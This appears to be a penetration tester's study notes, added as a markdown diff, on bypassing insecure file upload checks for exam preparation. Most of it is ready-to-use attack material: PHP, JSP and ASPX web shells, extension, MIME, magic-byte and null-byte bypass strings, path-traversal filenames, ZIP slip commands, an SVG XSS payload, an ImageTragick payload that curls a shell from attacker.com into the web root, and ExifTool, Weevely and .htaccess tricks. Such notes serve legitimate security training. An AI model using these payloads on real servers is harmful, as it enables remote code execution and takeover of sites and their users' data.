@@ -1,0 +1,210 @@
+# File Upload Bypass
+
+> Insecure file upload allows attackers to upload malicious files leading to RCE, XSS, or path traversal.
+
+---
+
+## 💥 Attack Goals
+
+1. **RCE** — Upload web shell (.php, .jsp, .aspx)
+2. **XSS** — Upload SVG/HTML with scripts
+3. **Path Traversal** — Write file to unintended location
+4. **DoS** — Upload huge files, zip bombs
+
+---
+
+## 🐚 Web Shell Payloads
+
+```php
+# Minimal PHP shell
+<?php system($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+<?php eval($_POST['cmd']); ?>
+
+# One-liner
+<?=`$_GET[0]`?>
+
+# JSP shell
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+# ASPX shell
+<% Response.Write(new System.Diagnostics.Process()); %>
+```
+
+---
+
+## 🚫 Bypass Techniques
+
+### 1. Extension Bypass
+```
+# PHP alternatives
+.php3, .php4, .php5, .php7, .phtml, .phar, .phps
+.php%00.jpg  (null byte - older systems)
+.php.jpg     (if only last extension checked)
+
+# ASP alternatives  
+.asp, .aspx, .asa, .cer, .asax
+
+# JSP alternatives
+.jsp, .jspx, .jspa, .jsw, .jsv
+```
+
+### 2. MIME Type Bypass
+```
+# Change Content-Type in Burp
+Content-Type: image/jpeg   (while uploading .php)
+Content-Type: image/png
+Content-Type: image/gif
+```
+
+### 3. Magic Bytes / File Signature Bypass
+```
+# Add image magic bytes before PHP code
+GIF89a;<?php system($_GET['cmd']); ?>
+
+# PNG magic bytes
+\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
+
+# JPEG magic bytes
+\xff\xd8\xff<?php system($_GET['cmd']); ?>
+
+# In hex editor, prepend: FF D8 FF E0
+```
+
+### 4. Double Extension
+```
+shell.php.jpg
+shell.php.png
+shell.jpg.php   (if last extension used)
+```
+
+### 5. Case Variation
+```
+shell.PHP
+shell.PhP
+shell.pHp
+```
+
+### 6. Null Byte Injection
+```
+shell.php%00.jpg
+shell.php\x00.jpg
+```
+
+### 7. Path Traversal in Filename
+```
+../shell.php
+../../shell.php
+../../../var/www/html/shell.php
+```
+
+### 8. ZIP Slip (Archive Extraction)
+```bash
+# Create malicious zip
+mkdir -p tmp/../../var/www/html/
+cp shell.php tmp/../../var/www/html/
+zip -r malicious.zip tmp/
+```
+
+### 9. SVG XSS
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">alert('XSS')</script>
+</svg>
+```
+
+### 10. ImageTragick (CVE-2016-3714)
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://attacker.com/image.jpg"|curl attacker.com/shell.php -o /var/www/html/shell.php")'
+pop graphic-context
+```
+
+---
+
+## 🔍 Finding Upload Paths
+
+```bash
+# After uploading, find the file
+# Check response for file path
+# Common paths:
+/uploads/
+/files/
+/media/
+/images/
+/static/uploads/
+/wp-content/uploads/   (WordPress)
+/storage/              (Laravel)
+
+# Brute force with gobuster
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
+```
+
+---
+
+## 🛠️ Tools
+
+```bash
+# Burp Suite - modify upload requests
+# Upload Scanner (Burp extension) - automated bypass testing
+
+# ExifTool - embed PHP in image metadata
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg
+
+# Weevely - generate obfuscated PHP shell
+weevely generate password shell.php
+weevely https://target.com/uploads/shell.php password
+```
+
+---
+
+## 📋 File Upload Testing Checklist
+
+- [ ] Try uploading .php directly
+- [ ] Try double extensions (.php.jpg)
+- [ ] Change Content-Type to image/jpeg
+- [ ] Add magic bytes to PHP file
+- [ ] Try PHP alternatives (.phtml, .phar, .php5)
+- [ ] Test null byte injection
+- [ ] Check filename for path traversal
+- [ ] Upload SVG with XSS payload
+- [ ] Try ZIP file with path traversal
+- [ ] Check if file is executed or just stored
+- [ ] Test .htaccess upload (to override file type handling)
+- [ ] Upload web.config on IIS targets
+
+---
+
+## ⚙️ .htaccess Upload Attack
+
+```apache
+# Upload .htaccess to make server execute .jpg as PHP
+AddType application/x-httpd-php .jpg
+```
+
+---
+
+## 🧠 eWPTXv3 Tips
+
+- Always try **ExifTool** to embed PHP in metadata
+- **.htaccess** upload is very effective on Apache
+- Look for **file inclusion** after upload (LFI + upload = RCE)
+- Test **Content-Disposition** header manipulation
+- Try uploading **web.config** on IIS
+- Check if app uses **blacklist** (easily bypassed) vs whitelist
+
+---
+
+## 📚 References
+
+- [PortSwigger File Upload Labs](https://portswigger.net/web-security/file-upload)
+- [PayloadsAllTheThings File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
+- [HackTricks File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
+
+---
+
+*Notes by [@mtsboy01](https://github.com/mtsboy01) | MTS-SECURITY*
